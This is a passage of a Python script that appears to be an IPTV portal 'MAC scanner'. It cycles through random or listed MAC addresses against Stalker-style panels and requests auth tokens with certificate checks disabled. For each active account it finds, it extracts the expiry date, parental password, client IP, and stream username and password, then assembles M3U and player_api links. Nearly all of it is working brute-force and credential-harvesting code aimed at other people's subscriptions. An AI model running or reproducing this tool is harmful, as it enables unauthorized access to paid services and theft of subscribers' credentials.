        return f"{hostname}:{port}"
    return None

def d1():
    global status_code
    timeout, xbagx, xbag, xbag1 = 8, 8, 10, 4 
# orginalne ustawienia 
#    timeout, xbagx, xbag, xbag1 = 15, 10, 12, 4
    bag, bag1 = 0, 0
    global hitc, hitr, lduruno
    global tokenr,bots,panelsay,botsay,bot
    panel=(paneltotLen[panelsay].replace('\n',''))
    panel = extract_host_port(panel)
    panelsay=panelsay+1
    bots=bots+1
    for mc in range(botsay,macuz,4):
        get_run_time()
        total=mc
        if dsyno=="0":
            mac=randommac()
            mac=mac.upper()
        else:
            macv=re.search(pattern,mactotLen[mac],re.IGNORECASE)
            if not macv: continue
            mac = macv.group()
        macs=mac.upper().replace(':','%3A')
        bot="Bot_"+str(int(bots+1))
        oran=""
        oran=round(((total)/(macuz)*100),2)
        echok(mac,bot,total,hitc,oran,tokenr,panel)
        bag=0
        veri=""
        while True:
            try:
                res = ses.get(url1(panel), headers=hea1(panel,macs), timeout=timeout, verify=False)
                status_code=f"{replace_status(res.status_code)}"
                veri=str(res.text)
                break
            except:
                break
                bag=bag+1
                time.sleep(1)
                if bag==xbag:break
        tokenr=MAGENTA
        if 'token' in veri:
            tokenr=RESET
            token=veri.replace('{"js":{"token":"',"")
            token=token.split('"')[0]
            bag=0
            while True:
               try:
                 res = ses.get(url22(panel,macs), headers=hea2(macs,token,panel), timeout=timeout, verify=False)
                 veri=""
                 veri=str(res.text)
                 adult=veri.split('parent_password":"')[1]
                 adult=adult.split('","bright')[0]
                 break
               except:
                   bag=bag+1
                   time.sleep(1)
                   if bag==xbag:break
            id="null"
            ip=""
            try:
                 id=veri.split('{"js":{"id":')[1]
                 id=id.split(',"name')[0]
                 ip=veri.split('ip":"')[1]
                 ip=ip.split('"')[0]
            except:pass
            if not id=="null":
                bag=0
                while True:
                     try:
                         res = ses.get(url3(panel), headers=hea2(macs,token,panel), timeout=timeout, verify=False)
                         veri=""
                         veri=str(res.text)
                         break
                     except:
                         bag=bag+1
                         time.sleep(1)
                         if bag==xbag:break
                if not veri.count('phone')==0:
                     trh=""
                     if 'end_date' in veri:
                         trh=veri.split('end_date":"')[1]
                         trh=trh.split('"')[0]
                     elif 'phone' in veri:
                           try:
                               trh=veri.split('phone":"')[1]
                               trh=trh.split('"')[0]
                               if trh.lower()[:2] =='un':KalanGun=(" Dni")
                               else:
                                   KalanGun=(str(tarih_clear(trh))+" Dni")
                                   trh=trh+' '+ KalanGun
                           except:pass
                     if not trh: break
                     if "-" in KalanGun: break
                     hitr=FCYAN
                     hitc=hitc+1
                     hitprint(panel,mac,trh)
                     bag=0
                     while True:
                         try:
                             res = ses.get(url6(panel), headers=hea2(macs,token,panel), timeout=timeout, verify=False)
                             veri=""
                             veri=str(res.text)
                             cid=""
                             cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
                             break
                         except:
                             bag=bag+1
                             time.sleep(1)
                             if bag==xbagx:cid="94067";break
                     real=panel
                     m3ulink=""
                     user=""
                     pas=""
                     durum="« [❌] ᴛᴀᴋ/ɴɪᴇ »"
                     bag=0
                     while True:
                         try:
                             res = ses.get(url(str(cid),panel), headers=hea2(macs,token,panel), timeout=timeout, verify=False)
                             veri=""
                             veri=str(res.text)
                             link=veri.split('ffmpeg ')[1].split('"')[0].replace("\\/", "/")
                             real='http://'+link.split('://')[1].split('/')[0]+'/c/'
                             user=str(link.replace('live/','').split('/')[3])
                             pas=str(link.replace('live/','').split('/')[4])
                             m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8" 
                             durum=goruntu(link,panel)
                             break
                         except:
                             bag=bag+1
                             time.sleep(1)
                             if bag==xbag:break
                     playerapi=""
                     if not m3ulink=="":
                         playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                         playerapi=m3uapi(playerlink,macs,token,panel)
                         if playerapi=="":
                             playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
                             playerapi=m3uapi(playerlink,macs,token,panel)
                     SN=(hashlib.md5(macs.encode('utf-8')).hexdigest())
                     SNENC=SN.upper()
                     SNCUT=SNENC[:13]
                     DEV=hashlib.sha256(macs.encode('utf-8')).hexdigest()
                     DEVENC=DEV.upper()
                     SG=SNCUT+'+'+(macs)
                     SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
                     SINGENC=SING.upper()
                     url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
                     while True:
                         try:
                             res = ses.get(url10, headers=hea2(macs,token,panel), timeout=15, verify=False)
                             break
                         except:
                             bag1=bag1+1
                             time.sleep(2)
                             if bag1==4:break
                     bag1=0
                     veri=str(res.text)
                     kanalsayisi=str(veri.count("stream_id"))
                     url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
                     while True:
                         try:
                             res = ses.get(url10, headers=hea2(macs,token,panel), timeout=15, verify=False)
                             break
                         except:
                             bag1=bag1+1
                             time.sleep(2)
                             if bag1==4:break
                     bag1=0
                     veri=str(res.text)
                     filmsayisi=str(veri.count("stream_id"))
                     url10="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
                     while True:
                         try:
                             res = ses.get(url10, headers=hea2(macs,token,panel), timeout=15, verify=False)
                             break
                         except:
                             bag1=bag1+1
                             time.sleep(2)
                             if bag1==4:break
                     bag1=0
                     veri=str(res.text)
                     dizisayisi=str(veri.count("series_id"))
                     vpn=""
                     vpn = vpnip(ip) if ip != "" else " ʙʀᴀᴋ ᴀᴅʀᴇsᴜ ɪᴘ ᴋʟɪᴇɴᴛᴀ "
                     livelist=""
                     vodlist=""
                     serieslist=""
                     if kanalkata=="1" or kanalkata=="2":
                         listlink=liveurl(panel)
                         livel=' ♦️ '
                         livelist=list(listlink,macs,token,livel,panel)
                     if kanalkata=="2":
                         listlink=vodurl(panel)
                         livel=' 🔹 '
                         vodlist=list(listlink,macs,token,livel,panel)
                         listlink=seriesurl(panel)
                         livel=' 🔸 '
                         serieslist=list(listlink,macs,token,livel,panel)
                     if kanalkata == "1" or kanalkata == "2":
                         listlink = liveurl(panel)
                         livel = '🔸'
                         livelist = replace_symbols(list(listlink,macs,token,livel,panel))
                     if kanalkata == "2":
                         listlink = vodurl(panel)
                         livel = '🔸'
                         vodlist = replace_symbols(list(listlink,macs,token,livel,panel))
                     if kanalkata == "2":
                         listlink = seriesurl(panel)
                         livel = '🔸'
                         serieslist = replace_symbols(list(listlink,macs,token,livel,panel))
                     if trh: hit(mac,trh,panel,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi,adult)
basla()